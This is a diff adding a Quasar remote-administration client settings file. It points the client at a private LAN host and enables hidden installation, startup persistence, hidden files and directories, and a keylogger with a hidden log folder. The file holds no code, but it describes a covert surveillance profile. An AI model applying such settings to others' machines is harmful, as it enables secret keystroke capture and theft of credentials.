@@ -1,0 +1,38 @@
+<settings>
+  <Tag>Station</Tag>
+  <Hosts>192.168.1.245:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>af50e4bf-f0a6-4518-b1b9-bc92cbdf7d66</Mutex>
+  <UnattendedMode>False</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>Client</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>Quasar</InstallSub>
+  <HideFile>True</HideFile>
+  <HideSubDirectory>True</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>Quasar Client</RegistryName>
+  <ChangeIcon>False</ChangeIcon>
+  <IconPath>
+  </IconPath>
+  <ChangeAsmInfo>False</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>True</HideLogDirectory>
+  <ProductName>
+  </ProductName>
+  <Description>
+  </Description>
+  <CompanyName>
+  </CompanyName>
+  <Copyright>
+  </Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>
+  </OriginalFilename>
+  <ProductVersion>
+  </ProductVersion>
+  <FileVersion>
+  </FileVersion>
+</settings>
